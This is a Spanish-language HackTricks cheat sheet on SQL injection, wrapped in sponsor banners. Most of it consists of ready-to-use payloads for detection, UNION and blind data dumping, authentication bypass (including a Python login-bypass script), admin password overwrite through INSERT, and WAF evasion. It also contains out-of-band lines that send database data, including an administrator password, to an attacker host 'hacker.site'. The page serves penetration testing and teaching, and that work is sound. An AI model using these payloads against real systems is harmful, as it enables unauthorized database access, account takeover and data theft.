# Inyecci√≥n SQL

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n del PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n la [**ropa oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) es el evento de ciberseguridad m√°s relevante en **Espa√±a** y uno de los m√°s importantes en **Europa**. Con **la misi√≥n de promover el conocimiento t√©cnico**, este congreso es un punto de encuentro crucial para profesionales de tecnolog√≠a y ciberseguridad en todas las disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## ¬øQu√© es la inyecci√≥n SQL?

Una **inyecci√≥n SQL** es una vulnerabilidad de seguridad que permite a los atacantes **interferir con las consultas a la base de datos** de una aplicaci√≥n. Esta vulnerabilidad puede permitir a los atacantes **ver**, **modificar** o **eliminar** datos a los que no deber√≠an tener acceso, incluida la informaci√≥n de otros usuarios o cualquier dato al que la aplicaci√≥n pueda acceder. Tales acciones pueden resultar en cambios permanentes en la funcionalidad o contenido de la aplicaci√≥n o incluso en la compromisi√≥n del servidor o la denegaci√≥n de servicio.


## Detecci√≥n del punto de entrada

Cuando un sitio parece ser **vulnerable a la inyecci√≥n SQL (SQLi)** debido a respuestas inusuales del servidor a entradas relacionadas con SQLi, el **primer paso** es comprender c√≥mo **inyectar datos en la consulta sin interrumpirla**. Esto requiere identificar el m√©todo para **escapar del contexto actual** de manera efectiva.
Estos son algunos ejemplos √∫tiles:
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
Entonces, necesitas saber c√≥mo **arreglar la consulta para que no haya errores**. Para arreglar la consulta puedes **introducir** datos para que la **consulta anterior acepte los nuevos datos**, o simplemente puedes **introducir** tus datos y **agregar un s√≠mbolo de comentario al final**.

_Ten en cuenta que si puedes ver mensajes de error o detectar diferencias cuando una consulta est√° funcionando y cuando no lo est√°, esta fase ser√° m√°s f√°cil._

### **Comentarios**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### Confirmaci√≥n con operaciones l√≥gicas

Un m√©todo confiable para confirmar una vulnerabilidad de inyecci√≥n SQL implica ejecutar una **operaci√≥n l√≥gica** y observar los resultados esperados. Por ejemplo, un par√°metro GET como `?username=Peter` que produce un contenido id√©ntico cuando se modifica a `?username=Peter' o '1'='1` indica una vulnerabilidad de inyecci√≥n SQL.

De manera similar, la aplicaci√≥n de **operaciones matem√°ticas** sirve como una t√©cnica de confirmaci√≥n efectiva. Por ejemplo, si al acceder a `?id=1` y `?id=2-1` se produce el mismo resultado, es indicativo de una inyecci√≥n SQL.

Ejemplos que demuestran la confirmaci√≥n mediante operaciones l√≥gicas:
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
Esta lista de palabras fue creada para intentar **confirmar inyecciones SQL** de la manera propuesta:

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### Confirmaci√≥n con Temporizaci√≥n

En algunos casos, **no notar√°s ning√∫n cambio** en la p√°gina que est√°s probando. Por lo tanto, una buena manera de **descubrir inyecciones SQL ciegas** es hacer que la base de datos realice acciones que tengan un **impacto en el tiempo** que la p√°gina necesita para cargarse.\
Por lo tanto, vamos a concatenar en la consulta SQL una operaci√≥n que llevar√° mucho tiempo en completarse:
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
En algunos casos, las **funciones de espera no estar√°n permitidas**. En lugar de usar esas funciones, podr√≠as hacer que la consulta **realice operaciones complejas** que llevar√°n varios segundos. _Los ejemplos de estas t√©cnicas se comentar√°n por separado en cada tecnolog√≠a (si las hay)_.

### Identificaci√≥n del Back-end

La mejor manera de identificar el back-end es intentar ejecutar funciones de los diferentes back-ends. Puedes usar las **funciones de espera** de la secci√≥n anterior o estas (tabla de [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification):
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
Tambi√©n, si tienes acceso a la salida de la consulta, podr√≠as hacer que **imprima la versi√≥n de la base de datos**.

{% hint style="info" %}
A continuaci√≥n vamos a discutir diferentes m√©todos para explotar diferentes tipos de Inyecci√≥n SQL. Utilizaremos MySQL como ejemplo.
{% endhint %}

### Identificaci√≥n con PortSwigger

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## Explotando Union Based

### Detectando el n√∫mero de columnas

Si puedes ver la salida de la consulta, esta es la mejor manera de explotarla.\
En primer lugar, necesitamos averiguar el **n√∫mero** de **columnas** que est√° devolviendo la **solicitud inicial**. Esto se debe a que **ambas consultas deben devolver el mismo n√∫mero de columnas**.\
Normalmente se utilizan dos m√©todos para este prop√≥sito:

#### Order/Group by

Para determinar el n√∫mero de columnas en una consulta, ajusta incrementalmente el n√∫mero utilizado en las cl√°usulas **ORDER BY** o **GROUP BY** hasta que se reciba una respuesta falsa. A pesar de las funcionalidades distintas de **GROUP BY** y **ORDER BY** dentro de SQL, ambos se pueden utilizar de manera id√©ntica para determinar el recuento de columnas de la consulta.
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

Selecciona m√°s y m√°s valores nulos hasta que la consulta sea correcta:
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
### Extraer nombres de bases de datos, nombres de tablas y nombres de columnas

En los siguientes ejemplos vamos a recuperar el nombre de todas las bases de datos, el nombre de la tabla de una base de datos, y los nombres de las columnas de la tabla:
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_Existen diferentes formas de descubrir estos datos en cada base de datos, pero siempre se sigue la misma metodolog√≠a._

## Explotando Union Based Oculto

Cuando la salida de una consulta es visible, pero una inyecci√≥n basada en union parece inalcanzable, significa la presencia de una **inyecci√≥n basada en union oculta**. Esta situaci√≥n a menudo conduce a una inyecci√≥n ciega. Para transformar una inyecci√≥n ciega en una basada en union, es necesario discernir la consulta de ejecuci√≥n en el backend.

Esto se puede lograr mediante el uso de t√©cnicas de inyecci√≥n ciega junto con las tablas predeterminadas espec√≠ficas de su Sistema de Gesti√≥n de Bases de Datos (DBMS) objetivo. Para comprender estas tablas predeterminadas, se recomienda consultar la documentaci√≥n del DBMS objetivo.

Una vez que se ha extra√≠do la consulta, es necesario adaptar su carga √∫til para cerrar de forma segura la consulta original. Posteriormente, se agrega una consulta de uni√≥n a su carga √∫til, facilitando la explotaci√≥n de la nueva inyecci√≥n basada en union accesible.

Para obtener informaci√≥n m√°s detallada, consulte el art√≠culo completo disponible en [Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f).

## Explotando Error Based

Si por alguna raz√≥n **no puedes** ver la **salida** de la **consulta** pero puedes **ver los mensajes de error**, puedes hacer que estos mensajes de error **exfiltren** datos de la base de datos.\
Siguiendo un flujo similar al de la explotaci√≥n basada en Union, podr√≠as lograr extraer la base de datos.
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## Explotando Blind SQLi

En este caso no puedes ver los resultados de la consulta o los errores, pero puedes distinguir cuando la consulta devuelve una respuesta verdadera o falsa porque hay diferentes contenidos en la p√°gina.\
En este caso, puedes abusar de ese comportamiento para volcar la base de datos car√°cter por car√°cter:
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## Explotando Error Blind SQLi

Este es el **mismo caso que antes** pero en lugar de distinguir entre una respuesta verdadera/falsa de la consulta, puedes **distinguir entre** un **error** en la consulta SQL o no (quiz√°s porque el servidor HTTP se bloquea). Por lo tanto, en este caso puedes forzar un error SQL cada vez que adivines correctamente el car√°cter:
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## Explotando SQLi basado en tiempo

En este caso **no hay** ninguna forma de **distinguir** la **respuesta** de la consulta basada en el contexto de la p√°gina. Sin embargo, puedes hacer que la p√°gina **tome m√°s tiempo en cargar** si el car√°cter adivinado es correcto. Ya hemos visto esta t√©cnica en uso antes para [confirmar una vulnerabilidad de SQLi con tiempo](./#confirming-with-timing).
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## Consultas Apiladas

Puedes usar consultas apiladas para **ejecutar m√∫ltiples consultas en sucesi√≥n**. Ten en cuenta que, si bien las consultas subsiguientes se ejecutan, los **resultados** no se **devuelven a la aplicaci√≥n**. Por lo tanto, esta t√©cnica se utiliza principalmente en relaci√≥n con **vulnerabilidades ciegas** donde puedes usar una segunda consulta para desencadenar una b√∫squeda DNS, un error condicional o un retraso en el tiempo.

**Oracle** no admite **consultas apiladas**. **MySQL, Microsoft** y **PostgreSQL** las admiten: `CONSULTA-1-AQU√ç; CONSULTA-2-AQU√ç`

## Explotaci√≥n Fuera de Banda

Si **ning√∫n otro** m√©todo de explotaci√≥n **funcion√≥**, puedes intentar hacer que la **base de datos exfiltre** la informaci√≥n a un **host externo** controlado por ti. Por ejemplo, a trav√©s de consultas DNS:
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### Exfiltraci√≥n de datos fuera de banda a trav√©s de XXE
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## Explotaci√≥n Automatizada

Consulta la [Hoja de Trucos de SQLMap](sqlmap/) para explotar una vulnerabilidad de SQLi con [**sqlmap**](https://github.com/sqlmapproject/sqlmap).

## Informaci√≥n Espec√≠fica de Tecnolog√≠a

Ya hemos discutido todas las formas de explotar una vulnerabilidad de Inyecci√≥n SQL. Encuentra algunos trucos m√°s dependientes de la tecnolog√≠a de la base de datos en este libro:

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

O encontrar√°s **muchos trucos relacionados con: MySQL, PostgreSQL, Oracle, MSSQL, SQLite y HQL en** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)



<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) es el evento de ciberseguridad m√°s relevante en **Espa√±a** y uno de los m√°s importantes en **Europa**. Con **la misi√≥n de promover el conocimiento t√©cnico**, este congreso es un punto de encuentro crucial para profesionales de la tecnolog√≠a y ciberseguridad en todas las disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## Bypass de Autenticaci√≥n

Lista para intentar evadir la funcionalidad de inicio de sesi√≥n:

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### Bypass de Autenticaci√≥n de Hash en Bruto
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
Este query muestra una vulnerabilidad cuando se utiliza MD5 con true para la salida en bruto en comprobaciones de autenticaci√≥n, lo que hace que el sistema sea susceptible a inyecciones SQL. Los atacantes pueden explotar esto creando entradas que, al ser hasheadas, producen partes inesperadas de comandos SQL, lo que lleva a un acceso no autorizado.
```sql
md5("ffifdyop", true) = 'or'6ÔøΩ]ÔøΩÔøΩ!r,ÔøΩÔøΩbÔøΩ
sha1("3fDf ", true) = QÔøΩu'='ÔøΩ@ÔøΩ[ÔøΩtÔøΩ- oÔøΩÔøΩ_-!
```
### Bypass de autenticaci√≥n de hash inyectado
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**Lista recomendada**:

Deber√≠as usar como nombre de usuario cada l√≠nea de la lista y como contrase√±a siempre: _**Pass1234.**_\
_(Estos payloads tambi√©n est√°n incluidos en la lista grande mencionada al principio de esta secci√≥n)_

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### GBK Autenticaci√≥n Bypass

SI ' est√° siendo escapado puedes usar %A8%27, y cuando ' es escapado se crear√°: 0xA80x5c0x27 (_‚ïò'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
Script de Python:
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### Inyecci√≥n pol√≠glota (multicontexto)
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## Declaraci√≥n Insert

### Modificar contrase√±a de objeto/usuario existente

Para hacerlo, debes intentar **crear un nuevo objeto con el nombre del "objeto maestro"** (probablemente **admin** en caso de usuarios) modificando algo:

* Crear usuario con el nombre: **AdMIn** (letras may√∫sculas y min√∫sculas)
* Crear un usuario con el nombre: **admin=**
* **Ataque de Truncamiento SQL** (cuando hay alg√∫n tipo de **l√≠mite de longitud** en el nombre de usuario o correo electr√≥nico) --> Crear usuario con el nombre: **admin \[muchos espacios] a**

#### Ataque de Truncamiento SQL

Si la base de datos es vulnerable y el n√∫mero m√°ximo de caracteres para el nombre de usuario es, por ejemplo, 30 y deseas suplantar al usuario **admin**, intenta crear un nombre de usuario llamado: "_admin \[30 espacios] a_" y cualquier contrase√±a.

La base de datos **verificar√°** si el **nombre de usuario** introducido **existe** dentro de la base de datos. Si **no**, cortar√° el **nombre de usuario** al **n√∫mero m√°ximo de caracteres permitidos** (en este caso a: "_admin \[25 espacios]_") y luego **eliminar√° autom√°ticamente todos los espacios al final actualizando** dentro de la base de datos al usuario "**admin**" con la **nueva contrase√±a** (puede aparecer alg√∫n error, pero no significa que no haya funcionado).

M√°s informaci√≥n: [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_Nota: Este ataque ya no funcionar√° como se describe en las √∫ltimas instalaciones de MySQL. Aunque las comparaciones a√∫n ignoran los espacios en blanco al final de forma predeterminada, intentar insertar una cadena que sea m√°s larga que la longitud de un campo resultar√° en un error y la inserci√≥n fallar√°. Para obtener m√°s informaci√≥n sobre esta verificaci√≥n: [https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)_

### MySQL Inserci√≥n basada en tiempo de comprobaci√≥n

Agrega tantos `','',''` como consideres necesario para salir de la declaraci√≥n VALUES. Si se produce un retraso, tienes una Inyecci√≥n SQL.
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

La cl√°usula `ON DUPLICATE KEY UPDATE` en MySQL se utiliza para especificar acciones para que la base de datos tome cuando se intenta insertar una fila que resultar√≠a en un valor duplicado en un √≠ndice UNIQUE o PRIMARY KEY. El siguiente ejemplo demuestra c√≥mo esta caracter√≠stica puede ser explotada para modificar la contrase√±a de una cuenta de administrador:

Ejemplo de Inyecci√≥n de Carga √ötil:

Una carga √∫til de inyecci√≥n podr√≠a ser creada de la siguiente manera, donde se intentan insertar dos filas en la tabla `users`. La primera fila es una distracci√≥n, y la segunda fila apunta al correo electr√≥nico de un administrador existente con la intenci√≥n de actualizar la contrase√±a:
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
### Extracci√≥n de informaci√≥n

#### Creaci√≥n de 2 cuentas al mismo tiempo

Cuando se intenta crear un nuevo usuario y nombre de usuario, se necesitan la contrase√±a y el correo electr√≥nico:
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### Usando decimal o hexadecimal

Con esta t√©cnica puedes extraer informaci√≥n creando solo 1 cuenta. Es importante tener en cuenta que no es necesario comentar nada.

Usando **hex2dec** y **substr**:
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
Para obtener el texto puedes usar:
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
Usando **hex** y **replace** (y **substr**):
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) es el evento de ciberseguridad m√°s relevante en **Espa√±a** y uno de los m√°s importantes en **Europa**. Con **la misi√≥n de promover el conocimiento t√©cnico**, este congreso es un punto de encuentro clave para profesionales de la tecnolog√≠a y ciberseguridad en todas las disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## Inyecci√≥n SQL enrutada

La inyecci√≥n SQL enrutada es una situaci√≥n en la que la consulta inyectable no es la que produce la salida, sino que la salida de la consulta inyectable va a la consulta que produce la salida. ([Desde Paper](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

Ejemplo:
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## Bypass de WAF

[By passes iniciales desde aqu√≠](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### Bypass sin espacios

Sin espacio (%20) - bypass utilizando alternativas de espaciado
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
### No Whitespace - bypass usando comentarios

En algunos casos, los filtros de entrada pueden bloquear ciertos caracteres, como espacios en blanco, para evitar inyecciones SQL. En tales situaciones, se puede intentar usar comentarios SQL para evitar los filtros y ejecutar con √©xito una inyecci√≥n SQL. Por ejemplo, en lugar de usar espacios en blanco, se pueden usar comentarios SQL (`--` o `#`) para separar palabras clave y funciones en una consulta SQL.
```sql
?id=1/*comment*/and/**/1=1/**/--
```
### Sin espacios - eludir usando par√©ntesis

En algunos casos, es posible eludir las restricciones de entrada que proh√≠ben el uso de espacios en una inyecci√≥n SQL al utilizar par√©ntesis. Esto se logra al rodear las palabras clave y operadores con par√©ntesis para evitar la necesidad de espacios. Por ejemplo, en lugar de `UNION SELECT`, se puede escribir como `(UNION)SELECT`. Este enfoque puede ser √∫til cuando se intenta realizar una inyecci√≥n SQL en un campo que filtra los espacios en blanco.
```sql
?id=(1)and(1)=(1)--
```
### Sin comas de bypass

Sin Coma - bypass utilizando OFFSET, FROM y JOIN
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### Saltos Gen√©ricos

Lista negra utilizando palabras clave - saltar utilizando may√∫sculas/min√∫sculas
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
### Lista negra utilizando palabras clave insensibles a may√∫sculas y min√∫sculas - evitando usando un operador equivalente
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### Bypass de WAF con Notaci√≥n Cient√≠fica

Puedes encontrar una explicaci√≥n m√°s detallada de este truco en el [blog de gosecure](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/).\
B√°sicamente puedes usar la notaci√≥n cient√≠fica de formas inesperadas para evadir el WAF:
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### Saltar la Restricci√≥n de Nombres de Columnas

En primer lugar, ten en cuenta que si la **consulta original y la tabla de la que deseas extraer la bandera tienen la misma cantidad de columnas**, podr√≠as simplemente hacer: `0 UNION SELECT * FROM flag`

Es posible **acceder a la tercera columna de una tabla sin usar su nombre** utilizando una consulta como la siguiente: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, por lo que en una inyecci√≥n sql se ver√≠a as√≠:
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
O utilizando un **bypass de coma**:
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
Este truco fue tomado de [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)

### Herramientas sugeridas para evadir WAF

{% embed url="https://github.com/m4ll0k/Atlas" %}

## Otras Gu√≠as

* [https://sqlwiki.netspi.com/](https://sqlwiki.netspi.com)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

## Lista de Detecci√≥n de Fuerza Bruta

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/sqli.txt" %}



‚Äã

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) es el evento de ciberseguridad m√°s relevante en **Espa√±a** y uno de los m√°s importantes en **Europa**. Con **la misi√≥n de promover el conocimiento t√©cnico**, este congreso es un punto de encuentro crucial para profesionales de la tecnolog√≠a y ciberseguridad en todas las disciplinas.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

